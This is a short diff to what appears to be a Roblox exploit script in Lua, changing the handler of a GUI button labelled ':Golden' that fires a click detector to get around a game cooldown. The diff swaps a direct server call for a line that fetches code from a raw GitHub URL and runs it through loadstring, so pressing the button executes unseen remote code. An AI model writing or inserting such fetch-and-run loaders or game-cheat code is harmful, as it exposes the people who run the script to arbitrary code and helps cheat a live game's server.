@@ -100,6 +100,6 @@ end)
 Section:NewButton(":Golden", "no cooldown so thats sick", function()
     fireclickdetector(workspace.Lobby.Golden.ClickDetector)
     wait(0.01)
-game:GetService("ReplicatedStorage"):WaitForChild("Goldify"):FireServer()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LoserGrape/tbh/main/eecute%20rn'))()
 
 end)
